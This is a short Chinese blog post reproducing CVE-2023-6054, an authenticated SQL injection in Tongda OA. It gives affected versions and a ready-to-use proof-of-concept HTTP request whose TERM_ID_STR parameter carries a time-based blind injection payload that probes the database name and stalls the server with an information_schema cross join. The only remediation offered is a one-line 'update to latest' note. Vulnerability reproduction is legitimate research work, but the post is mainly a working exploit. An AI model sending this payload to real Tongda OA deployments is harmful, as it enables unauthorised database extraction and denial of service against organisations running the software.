#  【漏洞复现】通达OA SQL注入漏洞（CVE-2023-6054）   
紫色皓月  皓月的笔记本   2023-11-26 23:00  
  
声明：请勿将文章内的相关技术用于非法目的，如有相关非法行为与文章作者和本公众号无关。请遵守《中华人民共和国网络安全法》。  
  
0X01 简介  
  
通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。  
  
  
  
官网：  
  
https://www.tongda2000.com/  
  
  
漏洞编号：  
  
CVE-2023-6054  
  
  
  
影响范围：  
  
通达OA >= 2017版  
  
通达OA <= 11.10  
  
  
复现环境：  
  
通达OA 2017版  
  
  
0X02   
漏洞复现  
  
漏洞利用需登录，还需要知识库权限。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4axEiaIyhaPIa14BCsFvSOA7QejLe5ucoJakfX0utGlC0YU7SPwIzv8vBdge7sL7hjz7fmuuQ50XLywwIgLZ6Kw/640?wx_fmt=jpeg&from=appmsg "")  
  
  
POC：  
```
GET /general/wiki/cp/manage/lock.php?TYPE=LOCK&TERM_ID_STR=1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1 HTTP/1.1
Host: 192.168.245.134
Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=620a3f5c; _csrf=fb9605328bee63ab5b949c268b858d698cf75170a848c7b0882a2b8a14d66f71a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22dJ8hKTNoKf_MTAQdu5ag7otcWNXsBgUm%22%3B%7D; creat_work=new; PHPSESSID=uim7dre68mjnos5qhk7oljv264; SID_66=1ca61957
Upgrade-Insecure-Requests: 1

TYPE=LOCK或UNLOCK才能触发漏洞，右下角查看延时
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4axEiaIyhaPIa14BCsFvSOA7QejLe5ucomKGPUaFawibPENW1icFRK1dZwvQkqPCwHXwtFn7I1dVhuuzyEUYIc8gg/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4axEiaIyhaPIa14BCsFvSOA7QejLe5ucockz7Cjc5RQXiaBc4BogaF9ngBd6mWb9WVdb19CcchOE56RHNAUZQqZA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
  
0X03 修复建议  
  
更新至最新版！  
  
  
0X04 写在最后  
  
  
回复“加群”，获取群号。  
  
侵删！  
  
  
